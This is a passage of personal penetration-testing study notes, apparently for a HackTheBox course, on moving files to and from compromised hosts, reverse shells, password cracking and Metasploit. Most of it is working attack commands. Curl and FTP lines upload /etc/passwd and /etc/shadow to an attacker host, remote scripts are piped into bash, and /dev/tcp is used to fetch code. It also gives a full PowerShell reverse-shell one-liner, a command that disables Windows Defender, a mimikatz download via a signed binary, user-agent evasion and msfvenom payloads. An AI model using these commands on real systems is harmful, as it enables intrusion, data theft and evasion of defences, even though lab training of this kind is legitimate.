> `DavWWWRoot` is a special keyword recognized by the Windows Shell. No such folder exists on your WebDAV server. The DavWWWRoot keyword tells the Mini-Redirector driver, which handles WebDAV requests that you are connecting to the root of the WebDAV server.
> You can avoid using this keyword if you specify a folder that exists on your server when connecting to the server. For example: \192.168.49.128\sharefolder

uploading files using SMB:

```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\DavWWWRoot\
```

Or in a specific folder:
```powershell
copy C:\Users\john\Desktop\SourceCode.zip \\192.168.49.129\sharefolder\
```

#### FTP Uploads
Is very similar to downloading files, we only need to specify `--write` parameter to allow clients to upload files to our attack host.

```bash
sudo python3 -m pyftpdlib --port 21 --write
```

Upload file:
```bash
(New-Object Net.WebClient).UploadFile('ftp://192.168.49.128/ftp-hosts', 'C:\Windows\System32\drivers\etc\hosts')
```

If we don't have an interactive session we can create the file:
```powershell
C:\htb> echo open 192.168.49.128 > ftpcommand.txt
C:\htb> echo USER anonymous >> ftpcommand.txt
C:\htb> echo binary >> ftpcommand.txt
C:\htb> echo PUT c:\windows\system32\drivers\etc\hosts >> ftpcommand.txt
C:\htb> echo bye >> ftpcommand.txt
C:\htb> ftp -v -n -s:ftpcommand.txt
ftp> open 192.168.49.128

Log in with USER and PASS first.


ftp> USER anonymous
ftp> PUT c:\windows\system32\drivers\etc\hosts
ftp> bye
```


## Linux

### Download operation | Attacker -> Victim

#### Base64 Encoding / Decoding

Check hash
```bash
md5sum id_rsa
```

Encode ssh to key base64
```bash
cat id_rsa |base64 -w 0;echo
```

We copy the content and paste it into our target machine.

```bash
echo -n 'LS0tLS1CRUdJTiBPUEVOU1NIIFBSSVZBVEUgS0VZLS0tLS0KYjNCbGJuTnphQzFyWlhrdGRqRUFBQUFBQkc1dmJtVUFBQUFFYm05dVpRQUFBQUFBQUFBQkFBQUFsd0FBQUFkemMyZ3RjbgpOaEFBQUFBd0VBQVFBQUFJRUF6WjE0dzV1NU9laHR5SUJQSkg3Tm9Yai84YXNHRUcxcHpJbmtiN2hIMldRVGpMQWRYZE9kCno3YjJtd0tiSW56VmtTM1BUR3ZseGhDVkRRUmpBYzloQ3k1Q0duWnlLM3U2TjQ3RFhURFY0YUtkcXl0UTFUQXZZUHQwWm8KVWh2bEo5YUgxclgzVHUxM2FRWUNQTVdMc2JOV2tLWFJzSk11dTJONkJoRHVmQThhc0FBQUlRRGJXa3p3MjFwTThBQUFBSApjM05vTFhKellRQUFBSUVBeloxNHc1dTVPZWh0eUlCUEpIN05vWGovOGFzR0VHMXB6SW5rYjdoSDJXUVRqTEFkWGRPZHo3CmIybXdLYkluelZrUzNQVEd2bHhoQ1ZEUVJqQWM5aEN5NUNHblp5SzN1Nk40N0RYVERWNGFLZHF5dFExVEF2WVB0MFpvVWgKdmxKOWFIMXJYM1R1MTNhUVlDUE1XTHNiTldrS1hSc0pNdXUyTjZCaER1ZkE4YXNBQUFBREFRQUJBQUFBZ0NjQ28zRHBVSwpFdCtmWTZjY21JelZhL2NEL1hwTlRsRFZlaktkWVFib0ZPUFc5SjBxaUVoOEpyQWlxeXVlQTNNd1hTWFN3d3BHMkpvOTNPCllVSnNxQXB4NlBxbFF6K3hKNjZEdzl5RWF1RTA5OXpodEtpK0pvMkttVzJzVENkbm92Y3BiK3Q3S2lPcHlwYndFZ0dJWVkKZW9VT2hENVJyY2s5Q3J2TlFBem9BeEFBQUFRUUNGKzBtTXJraklXL09lc3lJRC9JQzJNRGNuNTI0S2NORUZ0NUk5b0ZJMApDcmdYNmNoSlNiVWJsVXFqVEx4NmIyblNmSlVWS3pUMXRCVk1tWEZ4Vit0K0FBQUFRUURzbGZwMnJzVTdtaVMyQnhXWjBNCjY2OEhxblp1SWc3WjVLUnFrK1hqWkdqbHVJMkxjalRKZEd4Z0VBanhuZEJqa0F0MExlOFphbUt5blV2aGU3ekkzL0FBQUEKUVFEZWZPSVFNZnQ0R1NtaERreWJtbG1IQXRkMUdYVitOQTRGNXQ0UExZYzZOYWRIc0JTWDJWN0liaFA1cS9yVm5tVHJRZApaUkVJTW84NzRMUkJrY0FqUlZBQUFBRkhCc1lXbHVkR1Y0ZEVCamVXSmxjbk53WVdObEFRSURCQVVHCi0tLS0tRU5EIE9QRU5TU0ggUFJJVkFURSBLRVktLS0tLQo=' | base64 -d > id_rsa
```

Check the hash:
```bash
md5sum id_rsa
```

Also you can upload files using the reverse operation.

#### Downloads with Wget and cURL

Using wget
```bash
wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh
```

Using curl:
```bash
curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
```

#### Fileless Attacks using linux

The way Linux works and how pipes operate, we can use Linux tools to avoid download files.

> [!NOTE]
> **Execution of the payload may be fileless when you use a pipe, depending on the payload chosen it may create temporary files on disk**
> Some payload such as `mkfifo` write files to disk.

Using curl for fileless attack:
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Using python:
```bash
wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3
```

#### Download with Bash (/dev/tcp)
There may also be situations where non of the well-known file transfer tools are available. As long as Bash version 2.04, the built-in /dev/tcp device file can be used for simply file downloads.

Connect to the target webserver
```bash
exec 3<>/dev/tcp/10.10.10.32/80
```

HTTP Get Request
```bash
echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3
```

Print the response:
```bash
cat <&3
```

Execute it:
```bash
bash <&3
```

#### SSH Downloads

Enable the ssh server in our attacker machine:
```bash
sudo systemctl enable ssh
```

```bash
sudo systemctl start ssh
```

Checking for ssh listening port
```bash
netstat -lnpt
```

Download files in the victim machine using scp:
```bash
scp plaintext@192.168.49.128:/root/myroot.txt .
```

> [!NOTE]
> **Temporary user account**
> You can create a temporary user account for file transfers and avoid using your primary credentials or keys on a remote computer


### Upload operations | victim -> attacker
There are also situations such as binary exploitation and packet capture analysis, where we must upload files from our target machine onto our attacker host.

#### Web Upload
Let's see how to use `uploadserver` module to use HTTPS for secure communication.

```bash
sudo python3 -m pip install --user uploadserver
```

Create a certificate, in this case self-signed:
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

The **webserver should not host the certificate**. We recommend creating a new directory to host the file for our webserver.

```bash
mkdir https && cd https
```

```bash
sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
```

Now, from our compromised machine, let's upload the /etc/passwd and /etc/shadow files.
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
```

We use `--insecure` because we used a self-signed certificate that we trust.

##### Web File transfer method with python3

```bash
python3 -m http.server
```

##### Web File transfer method with python2.7
```bash
python2.7 -m SimpleHTTPServer
```

##### Web File transfer method with php
```bash
php -S 0.0.0.0:8000
```

##### Web File transfer method with ruby
```bash
ruby -run -ehttpd . -p8000
```

#### Download the file from the target machine onto the attacker machine

Attacker machine:
```bash
wget 192.168.49.128:8000/filetotransfer.txt
```

It is important to consider that inbound traffic may be blocked. For this reason we are transferring a file from our target onto our attack host, but we are not uploading the file.

#### SCP Upload
Some companies allow the ssh protocol for outbound connections, and it that's the case, we can use an SSH server with scp utility to upload files.

```bash
scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/
```

Remember that scp syntax is similar to cp or copy.

## Transferring Files with code
If some language program is installed in the victim machine we can take advantage and create a malicious script.

We can use some Windows default applications, such as cscript and mshta to execute JavaScript or VBScript code. JavaScript can also run on Linux hosts.

### Download

#### Python 2

```bash
python2.7 -c 'import urllib;urllib.urlretrieve ("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### Python3

```bash
python3 -c 'import urllib.request;urllib.request.urlretrieve("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh")'
```

#### PHP

```bash
php -r '$file = file_get_contents("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); file_put_contents("LinEnum.sh",$file);'
```

An alternative is fopen() module:
```bash
php -r 'const BUFFER = 1024; $fremote = 
fopen("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "rb"); $flocal = fopen("LinEnum.sh", "wb"); while ($buffer = fread($fremote, BUFFER)) { fwrite($flocal, $buffer); } fclose($flocal); fclose($fremote);'
```

Download and pipe it to bash
```bash
php -r '$lines = @file("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh"); foreach ($lines as $line_num => $line) { echo $line; }' | bash
```

The URL can be used as a filename with the @file function if the fopen wrappers have been enabled.

#### Ruby
```bash
ruby -e 'require "net/http"; File.write("LinEnum.sh", Net::HTTP.get(URI.parse("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh")))'
```

#### Perl
```Perl
perl -e 'use LWP::Simple; getstore("https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh", "LinEnum.sh");'
```

#### JavaScript


```js
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpRequest.5.1");
WinHttpReq.Open("GET", WScript.Arguments(0), /*async=*/false);
WinHttpReq.Send();
BinStream = new ActiveXObject("ADODB.Stream");
BinStream.Type = 1;
BinStream.Open();
BinStream.Write(WinHttpReq.ResponseBody);
BinStream.SaveToFile(WScript.Arguments(1));
```

To execute it:
```cmd
cscript.exe /nologo wget.js https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView.ps1
```

#### VBScript

```vbscript
dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
dim bStrm: Set bStrm = createobject("Adodb.Stream")
xHttp.Open "GET", WScript.Arguments.Item(0), False
xHttp.Send

with bStrm
    .type = 1
    .open
    .write xHttp.responseBody
    .savetofile WScript.Arguments.Item(1), 2
end with
```

```cmd
cscript.exe /nologo wget.vbs https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/dev/Recon/PowerView.ps1 PowerView2.ps1
```

### Upload

#### Python3

```bash
python3 -m uploadserver 
```

Upload a file using a python one-liner
```bash
python3 -c 'import requests;requests.post("http://192.168.49.128:8000/upload",files={"files":open("/etc/passwd","rb")})'
```

## Netcat (nc) and Ncat

### Netcat - compromised machine

With original netcat:
```bash
nc -l -p 8000 > SharpKatz.exe
```

With Ncat:
```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

From our attacker machine, we will connect to the compromised machine and send the file with netcat:
```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

Now, with Ncat:
```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

### Attack Host
Instead of listening on our compromised machine we can connect to a port on our attack host to perform the file transfer operation. This is useful where firewall blocking inbound connections.
With netcat

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

Compromised machine connect to netcat

```bash
nc 192.168.49.128 443 > SharpKatz.exe
```

With Ncat
Attacker machine
```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

Victim machine:
```bash
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

If we don't have Netcat or Ncat on our compromised machine, bash supports/read/write operations via /dev/tcp

In our attacker machine with netcat
```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

In our attacker machine with Ncat
```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

In the victim machine:
```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

## PowerShell

### PowerShell Remoting | WinRM
We will need administrative access, be a member of the `Remote Management Users` group, or have explicit permissions for PowerShell Remoting Session configuration.

#### host with WinRM

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Create a powershell remoting session to another pwned machine:

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

Copy file from our localhost to database session
```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

Copy database.txt from database01 session to our localhost
```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

## RDP

### Mounting a linux folder using rdesktop
```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### Mounting a Linux folder using xfreerdp
```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer file to and from the RDP session. You can use the Network tab in the explorer file.
![Pasted image 20260623191726.png](images/Pasted%20image%2020260623191726.png)

An alternative for Windows is use mstsc.exe remote desktop client.
Local Resources > Local devices and resources, more > Drives
![Pasted image 20260623191829.png](images/Pasted%20image%2020260623191829.png)

## Protected File transfer
Sometimes we gain access to highly sensitive data such as user lists, credentials...

### File encryption on Windows

You can use [Invoke-AESEncryption.ps1](https://www.powershellgallery.com/packages/DRTools/4.0.2.3/Content/Functions%5CInvoke-AESEncryption.ps1) script. Provide encryption of files and text:
```powershell

.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Text "Secret Text" 

Description
-----------
Encrypts the string "Secret Test" and outputs a Base64 encoded ciphertext.
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Text "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs="
 
Description
-----------
Decrypts the Base64 encoded string "LtxcRelxrDLrDB9rBD6JrfX/czKjZ2CUJkrg++kAMfs=" and outputs plain text.
 
.EXAMPLE
Invoke-AESEncryption -Mode Encrypt -Key "p@ssw0rd" -Path file.bin
 
Description
-----------
Encrypts the file "file.bin" and outputs an encrypted file "file.bin.aes"
 
.EXAMPLE
Invoke-AESEncryption -Mode Decrypt -Key "p@ssw0rd" -Path file.bin.aes
 
Description
-----------
Decrypts the file "file.bin.aes" and outputs the decrypted file "file.bin"
#>
function Invoke-AESEncryption {
    [CmdletBinding()]
    [OutputType([string])]
    Param
    (
        [Parameter(Mandatory = $true)]
        [ValidateSet('Encrypt', 'Decrypt')]
        [String]$Mode,

        [Parameter(Mandatory = $true)]
        [String]$Key,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptText")]
        [String]$Text,

        [Parameter(Mandatory = $true, ParameterSetName = "CryptFile")]
        [String]$Path
    )

    Begin {
        $shaManaged = New-Object System.Security.Cryptography.SHA256Managed
        $aesManaged = New-Object System.Security.Cryptography.AesManaged
        $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
        $aesManaged.BlockSize = 128
        $aesManaged.KeySize = 256
    }

    Process {
        $aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))

        switch ($Mode) {
            'Encrypt' {
                if ($Text) {$plainBytes = [System.Text.Encoding]::UTF8.GetBytes($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $plainBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName + ".aes"
                }

                $encryptor = $aesManaged.CreateEncryptor()
                $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
                $encryptedBytes = $aesManaged.IV + $encryptedBytes
                $aesManaged.Dispose()

                if ($Text) {return [System.Convert]::ToBase64String($encryptedBytes)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File encrypted to $outPath"
                }
            }

            'Decrypt' {
                if ($Text) {$cipherBytes = [System.Convert]::FromBase64String($Text)}
                
                if ($Path) {
                    $File = Get-Item -Path $Path -ErrorAction SilentlyContinue
                    if (!$File.FullName) {
                        Write-Error -Message "File not found!"
                        break
                    }
                    $cipherBytes = [System.IO.File]::ReadAllBytes($File.FullName)
                    $outPath = $File.FullName -replace ".aes"
                }

                $aesManaged.IV = $cipherBytes[0..15]
                $decryptor = $aesManaged.CreateDecryptor()
                $decryptedBytes = $decryptor.TransformFinalBlock($cipherBytes, 16, $cipherBytes.Length - 16)
                $aesManaged.Dispose()

                if ($Text) {return [System.Text.Encoding]::UTF8.GetString($decryptedBytes).Trim([char]0)}
                
                if ($Path) {
                    [System.IO.File]::WriteAllBytes($outPath, $decryptedBytes)
                    (Get-Item $outPath).LastWriteTime = $File.LastWriteTime
                    return "File decrypted to $outPath"
                }
            }
        }
    }

    End {
        $shaManaged.Dispose()
        $aesManaged.Dispose()
    }
}
```

#### Import Module Invoke-AESEncryption.ps1
One time load in the victim machine, you need to import the module:
```powershell
Import-Module .\Invoke-AESEncryption.ps1
```

This command create an ecryption file with the same name as the encrypted, but with the extension "aes"

```powershell
Invoke-AESEncryption -Mode Encrypt -Key "p4ssw0rd" -Path .\scan-results.txt
```

### File encryption on Linux
We can use OpenSSL, you need to enter a password.

```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc

enter aes-256-cbc encryption password:                                                         
Verifying - enter aes-256-cbc encryption password:
```

Decrypt passwd.enc with openssl

```bash
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd                    

enter aes-256-cbc decryption password:
```

## Catching Files over HTTP/S

### Nginx - enabling PUT

Create a directory to handle uploaded files
```bash
sudo mkdir -p /var/www/uploads/SecretUploadDirectory
```

Change the owner to www-data
```bash
sudo chown -R www-data:www-data /var/www/uploads/SecretUploadDirectory
```

Create the nginx configuration file, create `/etc/ngingx/sites-available/upload.conf`
```bash
server {
    listen 9001;
    
    location /SecretUploadDirectory/ {
        root    /var/www/uploads;
        dav_methods PUT;
    }
}
```

symlink our site to the sites-enabled directory
```bash
sudo ln -s /etc/nginx/sites-available/upload.conf /etc/nginx/sites-enabled/
```

start ngingx
```bash
sudo systemctl restart nginx.service
```

If we get any error messages, check `/var/log/nginx/error.log`. If using Pwnbox, we will see port 80 is already in use.

```
tail -2 /var/log/nginx/error.log
```

```
ss -lnpt | grep 80
```

```
ps -ef | grep 2811
```

Remove nginx default configuration
```
sudo rm /etc/nginx/sites-enabled/default
```

Upload File using cURL
```bash
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

```bash
sudo tail -1 /var/www/uploads/SecretUploadDirectory/users.txt 
```

## Living off the road

In addition, you can use resources such as LOLBAS and GTFOBins websites.

## Evading Detection

### Changing User Agent
If administrators have blacklisted any of these User Angents, Invoke-WebRequest contains a UserAgent parameter.

Listing User-Agents:
```powershell
[Microsoft.PowerShell.Commands.PSUserAgent].GetProperties() | Select-Object Name,@{label="User Agent";Expression={[Microsoft.PowerShell.Commands.PSUserAgent]::$($_.Name)}} | fl

Name       : InternetExplorer
User Agent : Mozilla/5.0 (compatible; MSIE 9.0; Windows NT; Windows NT 10.0; en-US)

Name       : FireFox
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) Gecko/20100401 Firefox/4.0

Name       : Chrome
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/534.6 (KHTML, like Gecko) Chrome/7.0.500.0
             Safari/534.6

Name       : Opera
User Agent : Opera/9.70 (Windows NT; Windows NT 10.0; en-US) Presto/2.2.1

Name       : Safari
User Agent : Mozilla/5.0 (Windows NT; Windows NT 10.0; en-US) AppleWebKit/533.16 (KHTML, like Gecko) Version/5.0
             Safari/533.16
```

Request with Chrome User Agent
```powershell
$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
```

```powershell
Invoke-WebRequest http://10.10.10.32/nc.exe -UserAgent $UserAgent -OutFile "C:\Users\Public\nc.exe"
```


```bash
nc -lvnp 80
```

### LOLBAS / GTFOBins

An example LOLBIN (living is the Intel Graphics Driver for Windows 10) is the Intel Graphics Driver for Windows 10 (GfxDownloadWrapper.exe), this download configuration files periodically.

```powershell
GfxDownloadWrapper.exe "http://10.10.10.132/mimikatz.exe" "C:\Temp\nc.exe"
```



# Shells & Payloads


payload in windows
```PowerShell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.158',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

If you're in a powershell you don't need to use `powershell -nop -c`.

In the server (attack machine)
```bash
sudo nc -lvnp 443
```


Disable Windows Defender Antivirus (AV)
```PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```

## Useful resources
- Mythic C2 Framework: [Source](https://github.com/its-a-feature/Mythic)
- Nishang: [Source](https://github.com/samratashok/nishang). Framework collection of Offensive PowerShell implants and scripts.
- Darkarmour: [Source](https://github.com/bats3c/darkarmour). Is a tool to generate and utilize obfuscated binaries for use against Windows hosts.

web shells:

- laudanum repository of web shell: https://github.com/jbarcia/Web-Shells/tree/master/laudanum
- aspx Nishang: Offensive powershell for red team. https://github.com/samratashok/nishang
	- Antak-WebShell: Powerfull powershell webshell
- php web shell wwwolf: https://github.com/WhiteWinterWolf/wwwolf-php-webshell.

## Useful tips
CMD does not keep a record of the commands used during the session, however, powershell does.

Exuection Policy and User account Control (UAC) can inihibit your ability to execute commands and scripts. These affect to powershell but not to cmd.

# Password attacks
## John The Ripper

Single crack mode is a rule-based cracking useful when targeting Linux credentials. Ot generates password candidates based on the victim's username, home directory, geocos values.

Example with the passwd file with the following content:
```bash
r0lf:$6$ues25dIanlctrWxg$nZHVz2z4kCy1760Ee28M1xtHdGoy0C2cYzZ8l2sVa1kIa8K9gAcdBP.GI6ng/qA4oaMrgElZ1Cb9OeXO4Fvy3/:0:0:Rolf Sebastian:/home/r0lf:/bin/bas
```

The tool will use `r0lf`, `Rolf Sebastian` and `/home/r0lf` to generate candidate passwords
```bash
john --single passwd
```

Using wordlist
```bash
john --wordlist=<wordlist_file> <hash_file>
```

One type of Identify hash format:
```bash
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Also you can see:
- https://pentestmonkey.net/cheat-sheet/john-the-ripper-hash-formats
- https://openwall.info/wiki/john/sample-hashes


Indicating the hash type:
```bash
john --format=zip [...] <hash_file>
```

### Cracking files
You can use tools such as `pdf2john` to convert a file with password to a john format

| Herramienta             | Descripción                                   |
| :---------------------- | :-------------------------------------------- |
| `pdf2john`              | Converts PDF documents for John               |
| `ssh2john`              | Converts SSH private keys for John            |
| `mscash2john`           | Converts MS Cash hashes for John              |
| `keychain2john`         | Converts OS X keychain files for John         |
| `rar2john`              | Converts RAR archives for John                |
| `pfx2john`              | Converts PKCS#12 files for John               |
| `truecrypt_volume2john` | Converts TrueCrypt volumes for John           |
| `keepass2john`          | Converts KeePass databases for John           |
| `vncpcap2john`          | Converts VNC PCAP files for John              |
| `putty2john`            | Converts PuTTY private keys for John          |
| `zip2john`              | Converts ZIP archives for John                |
| `hccap2john`            | Converts WPA/WPA2 handshake captures for John |
| `office2john`           | Converts MS Office documents for John         |
| `wpa2john`              | Converts WPA/WPA2 handshakes for John         |

You can find more if you use **locate \*2john\***

## Hashcat

The general syntax:
```bash
hashcat -a 0 -m 0 <hashes> [wordlist, rule, mask, ...]
```

- `-a` is used to specify the `attack mode`
- `-m` is used to specify the `hash type`
- `<hashes>` is a either a hash string, or a file containing one or more password hashes of the same type
- `[wordlist, rule, mask, ...]` is a placeholder for additional arguments that depend on the attack mode

To identify the hashID quickly you can use:
```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
```

### Attack modes

You have different attack modes:

#### Dictionary

You need to use `-a 0`
```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
```

If you need hashcat rules, you can found under `/usr/share/hashcat/rules`

Imagine that you obtain a md5 hash from a sql database, you are not able to crack with rockyou, we can apply some common rule transformations.

best64.rule contains 64 standard password modification. This add 64 different mutations to every word in your wordlist.

```bash
hashcat -a 0 -m 0 1b0556a75770563578569ae21392630c /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### Mask

This is used if we know the length of the password.

Hashcat includes several built-in character sets:

| Máscara | Conjunto de caracteres (Charset)      |
| :------ | :------------------------------------ |
| `?l`    | `abcdefghijklmnopqrstuvwxyz`          |
| `?u`    | `ABCDEFGHIJKLMNOPQRSTUVWXYZ`          |
| `?d`    | `0123456789`                          |
| `?h`    | `0123456789abcdef`                    |
| `?H`    | `0123456789ABCDEF`                    |
| `?s`    | `«space»!"#$%&'()*+,-./:;<=>?@[]^_`{` |
| `?a`    | `?l?u?d?s`                            |
| `?b`    | `0x00 - 0xff`                         |

Try with passwords which start with an uppercase letter, continue with four lowercase letters, a digit, and then a symbol

```
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

### Writing custom wordlists and rules

Many employees choose passwords that include the company's name. References to pets, friends, sports, hobbies, and other aspects of daily life.

Commonly, users use the following password to fit the most common policies:

| Description                           | Password Syntax  |
| :------------------------------------ | :--------------- |
| First letter is uppercase             | `Password`       |
| Adding numbers                        | `Password123`    |
| Adding year                           | `Password2022`   |
| Adding month                          | `Password02`     |
| Last character is an exclamation mark | `Password2022!`  |
| Adding special characters             | `Password@2022!` |

To create custom wordlists you can use rules

| Función | Descripción                                      |
| :------ | :----------------------------------------------- |
| .       | Do nothing                                       |
| l       | Lowercase all letters                            |
| u       | Uppercase all letters                            |
| c       | Capitalize the first letter and lowercase others |
| sXY     | Replace all instances of X with Y                |
| $!      | Add the exclamation character at the end         |

Each rule is written on a new line

```bash
cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@
```

We can use the following command to apply the rules in custom.rule to each word in password.list and store the mutated results in mut_password.list
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Example of the output:
```bash
cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### CeWL

You can use cewl to scan potential words from a company's website.
```
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```



# Metasploit

There are different modules:
```bash
ls /usr/share/metasploit-framework/modules

auxiliary  encoders  evasion  exploits  nops  payloads  post
```

There are different plugins:
```bash
ls /usr/share/metasploit-framework/plugins/
```

Scripts:
```bash
ls /usr/share/metasploit-framework/scripts/
```

Tools:
```bash
ls /usr/share/metasploit-framework/tools/
```

to launch:
```bash
msfconsole
```

You can use `-q` to not display the banner.

To update or install also you can use:

```bash
sudo apt update && sudo apt install metasploit-framework
```

For searching you can use `search`
```bash
help search
```

Searching something specific:
```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

to use a module
```msfconsole
use x
```

To see the options of the module
```bash
options
```

To obtain information about the module:
```msf
info
```

to apply variables:
```bash
set RHOSTS x
```

To apply globally:
```bash
setg RHOSTS x
```

To execute the exploit:
```bash
run/exploit
```

You can see targets that adapt the exploit to different operating systems, service pack and language version.

```bash
show targets
```

Show the payloads...
```bash
show payloads
```


Encodings
Shikata Ga Nai (SGN) was one of the most utilized encoding schemes, however nowadays it can be detected by NGFW.

To create our custom payload with msfvenom we can use:
```bash
msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 R | msfencode -b '\x00' -f perl -e x86/shikata_ga_nai
```

Generating without encoding:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
```

Encoded payload:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

To select an encoder for an existing payload we can use the `show encoders` command.

Metasploit offers a tool called `msf-virustotal` that we can use with an api key to analyze our payload
```bash
msf-virustotal -k <API key> -f TeamViewerInstall.exe
```


## Databases

metasploit have built-in support for the PostgreSQL database system.

```bash
sudo service postgresql status
```

```bash
sudo systemctl start postgresql
```

Initiate the database
```bash
sudo msfdb init
```

If metasploit is not updated it is possible that some error can appear.

```bash
sudo msfdb status
```

If we already have the database configured and are not able to change the password the MSF username, proceed with these commands:

```bash
msfdb reinit
cp /usr/share/metasploit-framework/config/database.yml ~/.msf4/
sudo service postgresql restart
msfconsole -q
```

One time inside metasploit, to see the commands:
```bash
help database
```

### Using the database
Me can manage different categories and hosts. These databases can be exported and imported. We can organize our workspaces.

Adding a workspace:
```bash
workspace -a Target_1
```

Too see available workspaces:
```bash
workspace
```

You can use the help of workspaces:
```bash
workspace -h
```

You can import xml nmap scan:
```bash
db_import Target.xml
```

Inside metasploit you can use nmap:
```bash
db_nmap -sV -sS 10.10.10.8
```

To export the database:
```bash
db_export -h
```

To see the stored host you can use:
```bash
hosts -h
```

Description and information on services discovered during scan or interaction
```bash
services -h
```

Credentials:
```bash
creds -h
```

To obtain the hashes obtained and saved in the databases you can use:
```bash
loot -h
```

## plugins

To install a new plugin you need to move the `.rb` file to the following path, `/usr/share/metasploit-framework/plugins`. Then, load in metasploit.

To load a plugin inside metasploit:
```bash
load nessus
